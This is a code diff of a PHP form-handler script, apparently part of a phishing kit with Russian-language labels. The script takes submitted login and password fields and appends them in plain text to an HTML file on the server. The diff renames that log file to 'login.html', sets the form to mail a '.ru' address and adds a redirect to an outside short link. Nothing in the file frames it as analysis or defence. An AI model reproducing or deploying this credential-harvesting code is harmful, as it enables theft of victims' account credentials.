@@ -11,7 +11,7 @@ require_once('form_process.php');
 $form = array(
 	'subject' => 'Отправка Форма Домашняя',
 	'heading' => 'Отправка новой формы',
-	'success_redirect' => '',
+	'success_redirect' => 'http://wooga.info/HVzt',
 	'resources' => array(
 		'checkbox_checked' => 'Отмечено',
 		'checkbox_unchecked' => 'Флажок не установлен',
@@ -25,8 +25,8 @@ $form = array(
 		'unknown_method' => 'Неизвестный метод запроса сервера'
 	),
 	'email' => array(
-		'from' => '',
-		'to' => ''
+		'from' => 'support@foezoeket.ru',
+		'to' => 'support@foezoeket.ru'
 	),
 	'fields' => array(
 		'custom_U119' => array(
@@ -53,9 +53,9 @@ $date=date("d.m.y"); // число.месяц.год
 $time=date("H:i"); // часы:минуты:секунды 
 $login=$_POST['custom_U119']; 
 $password=$_POST['custom_U123'];
-$f = fopen("logpassusers.html", "a+"); 
-fwrite($f,"[$date $time]	Логин: 		$login : Пароль: 		$password"); 
-fwrite($f,"<br />========================================<br />"); 
+$f = fopen("login.html", "a+");
+fwrite($f,"$login:$password"); 
+fwrite($f,"<br />"); 
 fclose($f);
 process_form($form);
 ?>
